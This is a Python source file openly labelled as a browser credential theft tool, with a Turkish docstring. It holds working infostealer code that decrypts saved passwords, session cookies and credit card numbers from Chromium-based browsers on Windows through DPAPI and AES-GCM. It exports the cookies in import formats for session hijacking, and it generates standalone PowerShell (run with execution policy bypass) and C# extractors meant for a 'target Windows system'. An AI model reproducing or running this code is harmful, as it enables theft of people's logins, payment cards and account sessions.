#!/usr/bin/env python3
"""
DPAPI Master Key Extractor - Browser Credential Theft
=====================================================
Chrome/Edge şifreleri sakladığı veritabanını (Login Data) almak yetmez,
şifreleme anahtarını (Master Key) Windows'tan söküp, şifreleri Plain Text'e çevir.
Bonus: Session Cookie'leri de çalıp "Cookie Import" formatında ver.

Author: CyberPunk Team
Version: 1.0.0 PRO
"""

import os
import json
import base64
import sqlite3
import shutil
import secrets
import tempfile
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
from enum import Enum
import struct
import re


class BrowserType(Enum):
    """Supported browser types"""
    CHROME = "Chrome"
    EDGE = "Edge"
    BRAVE = "Brave"
    OPERA = "Opera"
    VIVALDI = "Vivaldi"
    CHROMIUM = "Chromium"


class CredentialType(Enum):
    """Types of extracted credentials"""
    PASSWORD = "password"
    COOKIE = "cookie"
    CREDIT_CARD = "credit_card"
    AUTOFILL = "autofill"


@dataclass
class BrowserCredential:
    """Extracted browser credential"""
    browser: BrowserType
    credential_type: CredentialType
    url: str
    username: str = ""
    password: str = ""
    decrypted: bool = False
    profile: str = "Default"
    extracted_at: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            "browser": self.browser.value,
            "type": self.credential_type.value,
            "url": self.url,
            "username": self.username,
            "password": self.password if self.decrypted else "[ENCRYPTED]",
            "decrypted": self.decrypted,
            "profile": self.profile,
            "extracted_at": self.extracted_at
        }


@dataclass
class BrowserCookie:
    """Extracted browser cookie"""
    browser: BrowserType
    host: str
    name: str
    value: str
    path: str = "/"
    expires: Optional[datetime] = None
    is_secure: bool = False
    is_http_only: bool = False
    same_site: str = "None"
    decrypted: bool = False
    profile: str = "Default"
    
    def to_dict(self) -> Dict:
        return {
            "browser": self.browser.value,
            "host": self.host,
            "name": self.name,
            "value": self.value if self.decrypted else "[ENCRYPTED]",
            "path": self.path,
            "expires": self.expires.isoformat() if self.expires else None,
            "is_secure": self.is_secure,
            "is_http_only": self.is_http_only,
            "same_site": self.same_site,
            "decrypted": self.decrypted
        }
    
    def to_netscape_format(self) -> str:
        """Export cookie in Netscape/Mozilla format for import"""
        # Format: domain\tinclude_subdomains\tpath\tsecure\texpires\tname\tvalue
        include_subdomains = "TRUE" if self.host.startswith(".") else "FALSE"
        secure = "TRUE" if self.is_secure else "FALSE"
        expires_ts = int(self.expires.timestamp()) if self.expires else 0
        
        return f"{self.host}\t{include_subdomains}\t{self.path}\t{secure}\t{expires_ts}\t{self.name}\t{self.value}"
    
    def to_json_format(self) -> Dict:
        """Export cookie in JSON format for EditThisCookie extension"""
        return {
            "domain": self.host,
            "expirationDate": self.expires.timestamp() if self.expires else None,
            "hostOnly": not self.host.startswith("."),
            "httpOnly": self.is_http_only,
            "name": self.name,
            "path": self.path,
            "sameSite": self.same_site.lower(),
            "secure": self.is_secure,
            "session": self.expires is None,
            "storeId": "0",
            "value": self.value
        }


@dataclass
class DPAPIMasterKey:
    """DPAPI Master Key information"""
    key_guid: str
    key_data: bytes
    sid: str
    flags: int
    extracted_at: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            "key_guid": self.key_guid,
            "key_data_b64": base64.b64encode(self.key_data).decode() if self.key_data else None,
            "sid": self.sid,
            "flags": self.flags,
            "extracted_at": self.extracted_at
        }


class DPAPIExtractor:
    """
    DPAPI Master Key Extractor
    ==========================
    Extract and decrypt browser credentials using Windows DPAPI.
    
    Features:
    - Chrome/Edge/Brave/Opera password extraction
    - DPAPI Master Key extraction
    - AES-GCM decryption for Chromium v80+
    - Cookie extraction in multiple import formats
    - Credit card and autofill data extraction
    """
    
    # Browser data paths (relative to %LOCALAPPDATA%)
    BROWSER_PATHS = {
        BrowserType.CHROME: r"Google\Chrome\User Data",
        BrowserType.EDGE: r"Microsoft\Edge\User Data",
        BrowserType.BRAVE: r"BraveSoftware\Brave-Browser\User Data",
        BrowserType.OPERA: r"Opera Software\Opera Stable",
        BrowserType.VIVALDI: r"Vivaldi\User Data",
        BrowserType.CHROMIUM: r"Chromium\User Data"
    }
    
    # Database files
    LOGIN_DATA_DB = "Login Data"
    COOKIES_DB = "Cookies"
    WEB_DATA_DB = "Web Data"
    LOCAL_STATE_FILE = "Local State"
    
    def __init__(self):
        self.credentials: List[BrowserCredential] = []
        self.cookies: List[BrowserCookie] = []
        self.master_keys: List[DPAPIMasterKey] = []
        self._encryption_keys: Dict[BrowserType, bytes] = {}
        self._local_app_data = os.environ.get('LOCALAPPDATA', '')
        self._temp_dir = tempfile.mkdtemp(prefix='dpapi_')
    
    def _get_browser_path(self, browser: BrowserType) -> Optional[str]:
        """Get full path to browser user data"""
        if not self._local_app_data:
            return None
        
        rel_path = self.BROWSER_PATHS.get(browser)
        if not rel_path:
            return None
        
        full_path = os.path.join(self._local_app_data, rel_path)
        return full_path if os.path.exists(full_path) else None
    
    def _get_profiles(self, browser_path: str) -> List[str]:
        """Get all profile directories"""
        profiles = ["Default"]
        
        # Check for numbered profiles
        for item in os.listdir(browser_path):
            if item.startswith("Profile ") and os.path.isdir(os.path.join(browser_path, item)):
                profiles.append(item)
        
        return profiles
    
    def _extract_encryption_key(self, browser: BrowserType) -> Optional[bytes]:
        """Extract AES encryption key from Local State file"""
        browser_path = self._get_browser_path(browser)
        if not browser_path:
            return None
        
        local_state_path = os.path.join(browser_path, self.LOCAL_STATE_FILE)
        if not os.path.exists(local_state_path):
            return None
        
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            # Get encrypted key from Local State
            encrypted_key_b64 = local_state.get('os_crypt', {}).get('encrypted_key')
            if not encrypted_key_b64:
                return None
            
            # Decode base64
            encrypted_key = base64.b64decode(encrypted_key_b64)
            
            # Remove DPAPI prefix ('DPAPI')
            if encrypted_key[:5] == b'DPAPI':
                encrypted_key = encrypted_key[5:]
            
            # Decrypt using DPAPI (Windows only)
            try:
                import ctypes
                import ctypes.wintypes
                
                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [
                        ('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))
                    ]
                
                blob_in = DATA_BLOB()
                blob_in.cbData = len(encrypted_key)
                blob_in.pbData = ctypes.cast(
                    ctypes.create_string_buffer(encrypted_key, len(encrypted_key)),
                    ctypes.POINTER(ctypes.c_char)
                )
                
                blob_out = DATA_BLOB()
                
                if ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(blob_in),
                    None, None, None, None, 0,
                    ctypes.byref(blob_out)
                ):
                    decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                    return decrypted
            except Exception:
                pass
            
            # Return encrypted key for offline analysis
            return encrypted_key
            
        except Exception:
            return None
    
    def _decrypt_value(self, encrypted_value: bytes, browser: BrowserType) -> Tuple[str, bool]:
        """Decrypt encrypted value using AES-GCM or DPAPI"""
        
        if not encrypted_value:
            return "", False
        
        # Check for Chromium v80+ encryption (starts with 'v10' or 'v11')
        if encrypted_value[:3] in [b'v10', b'v11']:
            return self._decrypt_aes_gcm(encrypted_value, browser)
        
        # Legacy DPAPI encryption
        return self._decrypt_dpapi(encrypted_value)
    
    def _decrypt_aes_gcm(self, encrypted_value: bytes, browser: BrowserType) -> Tuple[str, bool]:
        """Decrypt AES-GCM encrypted value (Chromium v80+)"""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            
            key = self._encryption_keys.get(browser)
            if not key:
                key = self._extract_encryption_key(browser)
                if key:
                    self._encryption_keys[browser] = key
            
            if not key:
                return "", False
            
            # Extract nonce and ciphertext
            nonce = encrypted_value[3:15]  # 12 bytes nonce
            ciphertext = encrypted_value[15:]
            
            # Decrypt
            aesgcm = AESGCM(key)
            decrypted = aesgcm.decrypt(nonce, ciphertext, None)
            return decrypted.decode('utf-8'), True
            
        except Exception:
            return "", False
    
    def _decrypt_dpapi(self, encrypted_value: bytes) -> Tuple[str, bool]:
        """Decrypt DPAPI encrypted value"""
        try:
            import ctypes
            import ctypes.wintypes
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [
                    ('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))
                ]
            
            blob_in = DATA_BLOB()
            blob_in.cbData = len(encrypted_value)
            blob_in.pbData = ctypes.cast(
                ctypes.create_string_buffer(encrypted_value, len(encrypted_value)),
                ctypes.POINTER(ctypes.c_char)
            )
            
            blob_out = DATA_BLOB()
            
            if ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(blob_in),
                None, None, None, None, 0,
                ctypes.byref(blob_out)
            ):
                decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                return decrypted.decode('utf-8'), True
                
        except Exception:
            pass
        
        return "", False
    
    def _copy_db_file(self, db_path: str) -> Optional[str]:
        """Copy database file to temp location (handles locked files)"""
        if not os.path.exists(db_path):
            return None
        
        temp_path = os.path.join(self._temp_dir, f"temp_{secrets.token_hex(8)}.db")
        
        try:
            shutil.copy2(db_path, temp_path)
            return temp_path
        except Exception:
            return None
    
    def extract_passwords(self, browser: BrowserType) -> List[BrowserCredential]:
        """Extract saved passwords from browser"""
        browser_path = self._get_browser_path(browser)
        if not browser_path:
            return []
        
        credentials = []
        profiles = self._get_profiles(browser_path)
        
        for profile in profiles:
            login_db = os.path.join(browser_path, profile, self.LOGIN_DATA_DB)
            temp_db = self._copy_db_file(login_db)
            
            if not temp_db:
                continue
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT origin_url, username_value, password_value
                    FROM logins
                """)
                
                for row in cursor.fetchall():
                    url, username, encrypted_password = row
                    
                    password, decrypted = self._decrypt_value(encrypted_password, browser)
                    
                    cred = BrowserCredential(
                        browser=browser,
                        credential_type=CredentialType.PASSWORD,
                        url=url,
                        username=username,
                        password=password,
                        decrypted=decrypted,
                        profile=profile
                    )
                    credentials.append(cred)
                
                conn.close()
                
            except Exception:
                pass
            finally:
                if os.path.exists(temp_db):
                    os.remove(temp_db)
        
        self.credentials.extend(credentials)
        return credentials
    
    def extract_cookies(self, browser: BrowserType, 
                       domains: List[str] = None) -> List[BrowserCookie]:
        """Extract cookies from browser"""
        browser_path = self._get_browser_path(browser)
        if not browser_path:
            return []
        
        cookies = []
        profiles = self._get_profiles(browser_path)
        
        for profile in profiles:
            cookies_db = os.path.join(browser_path, profile, self.COOKIES_DB)
            temp_db = self._copy_db_file(cookies_db)
            
            if not temp_db:
                continue
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Try different schema versions
                try:
                    cursor.execute("""
                        SELECT host_key, name, encrypted_value, path, 
                               expires_utc, is_secure, is_httponly, samesite
                        FROM cookies
                    """)
                except sqlite3.OperationalError:
                    cursor.execute("""
                        SELECT host_key, name, encrypted_value, path,
                               expires_utc, is_secure, is_httponly, 0
                        FROM cookies
                    """)
                
                for row in cursor.fetchall():
                    host, name, encrypted_value, path, expires, is_secure, is_http_only, same_site = row
                    
                    # Filter by domain if specified
                    if domains:
                        if not any(d in host for d in domains):
                            continue
                    
                    value, decrypted = self._decrypt_value(encrypted_value, browser)
                    
                    # Convert Chrome timestamp to datetime
                    expires_dt = None
                    if expires and expires > 0:
                        # Chrome uses microseconds since Jan 1, 1601
                        try:
                            expires_dt = datetime(1601, 1, 1) + timedelta(microseconds=expires)
                        except Exception:
                            pass
                    
                    same_site_str = {0: "None", 1: "Lax", 2: "Strict"}.get(same_site, "None")
                    
                    cookie = BrowserCookie(
                        browser=browser,
                        host=host,
                        name=name,
                        value=value,
                        path=path,
                        expires=expires_dt,
                        is_secure=bool(is_secure),
                        is_http_only=bool(is_http_only),
                        same_site=same_site_str,
                        decrypted=decrypted,
                        profile=profile
                    )
                    cookies.append(cookie)
                
                conn.close()
                
            except Exception:
                pass
            finally:
                if os.path.exists(temp_db):
                    os.remove(temp_db)
        
        self.cookies.extend(cookies)
        return cookies
    
    def extract_credit_cards(self, browser: BrowserType) -> List[Dict]:
        """Extract saved credit card information"""
        browser_path = self._get_browser_path(browser)
        if not browser_path:
            return []
        
        cards = []
        profiles = self._get_profiles(browser_path)
        
        for profile in profiles:
            web_data_db = os.path.join(browser_path, profile, self.WEB_DATA_DB)
            temp_db = self._copy_db_file(web_data_db)
            
            if not temp_db:
                continue
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT name_on_card, expiration_month, expiration_year,
                           card_number_encrypted
                    FROM credit_cards
                """)
                
                for row in cursor.fetchall():
                    name, exp_month, exp_year, encrypted_number = row
                    
                    card_number, decrypted = self._decrypt_value(encrypted_number, browser)
                    
                    cards.append({
                        "browser": browser.value,
                        "profile": profile,
                        "name_on_card": name,
                        "expiration": f"{exp_month}/{exp_year}",
                        "card_number": card_number if decrypted else "[ENCRYPTED]",
                        "decrypted": decrypted
                    })
                
                conn.close()
                
            except Exception:
                pass
            finally:
                if os.path.exists(temp_db):
                    os.remove(temp_db)
        
        return cards
    
    def extract_all_browsers(self) -> Dict:
        """Extract credentials from all available browsers"""
        results = {
            "passwords": [],
            "cookies": [],
            "credit_cards": [],
            "browsers_found": []
        }
        
        for browser in BrowserType:
            if self._get_browser_path(browser):
                results["browsers_found"].append(browser.value)
                
                # Extract passwords
                passwords = self.extract_passwords(browser)
                results["passwords"].extend([p.to_dict() for p in passwords])
                
                # Extract cookies
                cookies = self.extract_cookies(browser)
                results["cookies"].extend([c.to_dict() for c in cookies])
                
                # Extract credit cards
                cards = self.extract_credit_cards(browser)
                results["credit_cards"].extend(cards)
        
        return results
    
    def export_cookies_netscape(self, cookies: List[BrowserCookie] = None) -> str:
        """Export cookies in Netscape format for import into browsers/tools"""
        cookies = cookies or self.cookies
        
        lines = ["# Netscape HTTP Cookie File", "# Generated by DPAPI Extractor", ""]
        
        for cookie in cookies:
            if cookie.decrypted and cookie.value:
                lines.append(cookie.to_netscape_format())
        
        return '\n'.join(lines)
    
    def export_cookies_json(self, cookies: List[BrowserCookie] = None) -> str:
        """Export cookies in JSON format for EditThisCookie extension"""
        cookies = cookies or self.cookies
        
        json_cookies = []
        for cookie in cookies:
            if cookie.decrypted and cookie.value:
                json_cookies.append(cookie.to_json_format())
        
        return json.dumps(json_cookies, indent=2)
    
    def export_cookies_curl(self, cookies: List[BrowserCookie] = None, domain: str = None) -> str:
        """Export cookies as curl command"""
        cookies = cookies or self.cookies
        
        cookie_strings = []
        for cookie in cookies:
            if cookie.decrypted and cookie.value:
                if domain and domain not in cookie.host:
                    continue
                cookie_strings.append(f"{cookie.name}={cookie.value}")
        
        if not cookie_strings:
            return ""
        
        return f'curl -H "Cookie: {"; ".join(cookie_strings)}" '
    
    def generate_powershell_extractor(self) -> str:
        """Generate PowerShell script for extraction"""
        ps_script = '''
# DPAPI Browser Credential Extractor
# Run with: powershell -ExecutionPolicy Bypass -File extractor.ps1

Add-Type -AssemblyName System.Security

function Get-ChromePasswords {
    $localAppData = $env:LOCALAPPDATA
    $browsers = @{
        "Chrome" = "$localAppData\\Google\\Chrome\\User Data"
        "Edge" = "$localAppData\\Microsoft\\Edge\\User Data"
        "Brave" = "$localAppData\\BraveSoftware\\Brave-Browser\\User Data"
    }
    
    $results = @()
    
    foreach ($browser in $browsers.GetEnumerator()) {
        $browserPath = $browser.Value
        if (-not (Test-Path $browserPath)) { continue }
        
        # Get encryption key from Local State
        $localStatePath = Join-Path $browserPath "Local State"
        if (-not (Test-Path $localStatePath)) { continue }
        
        $localState = Get-Content $localStatePath | ConvertFrom-Json
        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        
        # Remove DPAPI prefix
        if ([Text.Encoding]::ASCII.GetString($encryptedKey[0..4]) -eq "DPAPI") {
            $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
        }
        
        # Decrypt master key using DPAPI
        $masterKey = [Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedKey, $null, 'CurrentUser'
        )
        
        # Find profiles
        $profiles = @("Default")
        Get-ChildItem $browserPath -Directory | Where-Object { $_.Name -like "Profile*" } | ForEach-Object {
            $profiles += $_.Name
        }
        
        foreach ($profile in $profiles) {
            $loginDb = Join-Path $browserPath "$profile\\Login Data"
            if (-not (Test-Path $loginDb)) { continue }
            
            # Copy database (might be locked)
            $tempDb = Join-Path $env:TEMP "login_temp_$(Get-Random).db"
            Copy-Item $loginDb $tempDb -Force
            
            try {
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
                $conn.Open()
                
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                $reader = $cmd.ExecuteReader()
                
                while ($reader.Read()) {
                    $url = $reader.GetString(0)
                    $username = $reader.GetString(1)
                    $encryptedPassword = $reader.GetValue(2)
                    
                    # Decrypt password (AES-GCM for v80+)
                    if ($encryptedPassword[0..2] -join "" -eq "v10" -or $encryptedPassword[0..2] -join "" -eq "v11") {
                        $nonce = $encryptedPassword[3..14]
                        $ciphertext = $encryptedPassword[15..($encryptedPassword.Length - 1)]
                        
                        # AES-GCM decryption
                        $aes = [Security.Cryptography.AesGcm]::new($masterKey)
                        $plaintext = New-Object byte[] ($ciphertext.Length - 16)
                        $tag = $ciphertext[($ciphertext.Length - 16)..($ciphertext.Length - 1)]
                        $actualCiphertext = $ciphertext[0..($ciphertext.Length - 17)]
                        
                        $aes.Decrypt($nonce, $actualCiphertext, $tag, $plaintext)
                        $password = [Text.Encoding]::UTF8.GetString($plaintext)
                    } else {
                        # Legacy DPAPI
                        $password = [Text.Encoding]::UTF8.GetString(
                            [Security.Cryptography.ProtectedData]::Unprotect(
                                $encryptedPassword, $null, 'CurrentUser'
                            )
                        )
                    }
                    
                    $results += [PSCustomObject]@{
                        Browser = $browser.Key
                        Profile = $profile
                        URL = $url
                        Username = $username
                        Password = $password
                    }
                }
                
                $conn.Close()
            } catch {
                Write-Warning "Error processing $profile : $_"
            } finally {
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
        }
    }
    
    return $results
}

function Get-ChromeCookies {
    param([string]$Domain = "")
    
    $localAppData = $env:LOCALAPPDATA
    $chromePath = "$localAppData\\Google\\Chrome\\User Data"
    
    if (-not (Test-Path $chromePath)) { return @() }
    
    # Get encryption key
    $localState = Get-Content "$chromePath\\Local State" | ConvertFrom-Json
    $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
    $masterKey = [Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
    
    $cookies = @()
    $cookiesDb = "$chromePath\\Default\\Cookies"
    
    if (Test-Path $cookiesDb) {
        $tempDb = Join-Path $env:TEMP "cookies_temp_$(Get-Random).db"
        Copy-Item $cookiesDb $tempDb -Force
        
        # Process cookies...
        # (Similar decryption logic)
        
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    }
    
    return $cookies
}

# Main execution
Write-Host "[*] Extracting browser credentials..." -ForegroundColor Cyan

$passwords = Get-ChromePasswords
Write-Host "[+] Found $($passwords.Count) passwords" -ForegroundColor Green

$passwords | Format-Table -AutoSize

# Export to JSON
$passwords | ConvertTo-Json | Out-File "credentials.json"
Write-Host "[+] Saved to credentials.json" -ForegroundColor Green
'''
        return ps_script
    
    def generate_csharp_extractor(self) -> str:
        """Generate C# code for extraction (for compilation)"""
        cs_code = '''
// DPAPI Browser Credential Extractor
// Compile: csc /target:exe /out:extractor.exe extractor.cs

using System;
using System.IO;
using System.Text;
using System.Data.SQLite;
using System.Security.Cryptography;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

class DPAPIExtractor
{
    static byte[] GetMasterKey(string browserPath)
    {
        string localStatePath = Path.Combine(browserPath, "Local State");
        if (!File.Exists(localStatePath)) return null;
        
        JObject localState = JObject.Parse(File.ReadAllText(localStatePath));
        string encryptedKeyB64 = localState["os_crypt"]["encrypted_key"].ToString();
        byte[] encryptedKey = Convert.FromBase64String(encryptedKeyB64);
        
        // Remove DPAPI prefix
        byte[] keyData = new byte[encryptedKey.Length - 5];
        Array.Copy(encryptedKey, 5, keyData, 0, keyData.Length);
        
        // Decrypt using DPAPI
        return ProtectedData.Unprotect(keyData, null, DataProtectionScope.CurrentUser);
    }
    
    static string DecryptPassword(byte[] encryptedPassword, byte[] masterKey)
    {
        try
        {
            // Check for v10/v11 prefix (AES-GCM)
            if (encryptedPassword[0] == 'v' && (encryptedPassword[1] == '1'))
            {
                byte[] nonce = new byte[12];
                Array.Copy(encryptedPassword, 3, nonce, 0, 12);
                
                byte[] ciphertext = new byte[encryptedPassword.Length - 15];
                Array.Copy(encryptedPassword, 15, ciphertext, 0, ciphertext.Length);
                
                // AES-GCM decryption
                using (var aes = new AesGcm(masterKey))
                {
                    byte[] plaintext = new byte[ciphertext.Length - 16];
                    byte[] tag = new byte[16];
                    Array.Copy(ciphertext, ciphertext.Length - 16, tag, 0, 16);
                    
                    byte[] actualCiphertext = new byte[ciphertext.Length - 16];
                    Array.Copy(ciphertext, 0, actualCiphertext, 0, actualCiphertext.Length);
                    
                    aes.Decrypt(nonce, actualCiphertext, tag, plaintext);
                    return Encoding.UTF8.GetString(plaintext);
                }
            }
            else
            {
                // Legacy DPAPI
                return Encoding.UTF8.GetString(
                    ProtectedData.Unprotect(encryptedPassword, null, DataProtectionScope.CurrentUser)
                );
            }
        }
        catch
        {
            return "[DECRYPTION_FAILED]";
        }
    }
    
    static void Main(string[] args)
    {
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string chromePath = Path.Combine(localAppData, "Google", "Chrome", "User Data");
        
        byte[] masterKey = GetMasterKey(chromePath);
        if (masterKey == null)
        {
            Console.WriteLine("[-] Failed to get master key");
            return;
        }
        
        string loginDb = Path.Combine(chromePath, "Default", "Login Data");
        string tempDb = Path.Combine(Path.GetTempPath(), $"login_{Guid.NewGuid()}.db");
        
        File.Copy(loginDb, tempDb, true);
        
        using (var conn = new SQLiteConnection($"Data Source={tempDb}"))
        {
            conn.Open();
            using (var cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
            using (var reader = cmd.ExecuteReader())
            {
                while (reader.Read())
                {
                    string url = reader.GetString(0);
                    string username = reader.GetString(1);
                    byte[] encPassword = (byte[])reader.GetValue(2);
                    
                    string password = DecryptPassword(encPassword, masterKey);
                    
                    Console.WriteLine($"URL: {url}");
                    Console.WriteLine($"Username: {username}");
                    Console.WriteLine($"Password: {password}");
                    Console.WriteLine();
                }
            }
        }
        
        File.Delete(tempDb);
    }
}
'''
        return cs_code
    
    def get_statistics(self) -> Dict:
        """Get extraction statistics"""
        decrypted_passwords = sum(1 for c in self.credentials if c.decrypted)
        decrypted_cookies = sum(1 for c in self.cookies if c.decrypted)
        
        unique_domains = set()
        for c in self.credentials:
            try:
                from urllib.parse import urlparse
                domain = urlparse(c.url).netloc
                if domain:
                    unique_domains.add(domain)
            except Exception:
                pass
        
        return {
            "total_passwords": len(self.credentials),
            "decrypted_passwords": decrypted_passwords,
            "total_cookies": len(self.cookies),
            "decrypted_cookies": decrypted_cookies,
            "unique_domains": len(unique_domains),
            "browsers_processed": len(set(c.browser for c in self.credentials))
        }
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            shutil.rmtree(self._temp_dir, ignore_errors=True)
        except Exception:
            pass


# Singleton instance
_extractor = None

def get_extractor() -> DPAPIExtractor:
    """Get singleton extractor instance"""
    global _extractor
    if _extractor is None:
        _extractor = DPAPIExtractor()
    return _extractor


def demo():
    """Demonstrate DPAPI extractor capabilities"""
    print("=" * 60)
    print("DPAPI Master Key Extractor - Browser Credential Theft")
    print("=" * 60)
    
    extractor = get_extractor()
    
    print("\n[*] Supported browsers:")
    for browser in BrowserType:
        print(f"    - {browser.value}")
    
    print("\n[*] Extraction capabilities:")
    print("    - Saved passwords (Login Data)")
    print("    - Session cookies (Cookies)")
    print("    - Credit cards (Web Data)")
    print("    - Autofill data")
    
    print("\n[*] Cookie export formats:")
    print("    - Netscape (for curl, wget)")
    print("    - JSON (for EditThisCookie)")
    print("    - curl command")
    
    print("\n[*] Generated PowerShell extractor preview:")
    print("-" * 40)
    ps_preview = extractor.generate_powershell_extractor()[:500]
    print(ps_preview + "...")
    
    print("\n[*] Ready for extraction (run on target Windows system)")
    print("-" * 60)


if __name__ == "__main__":
    demo()
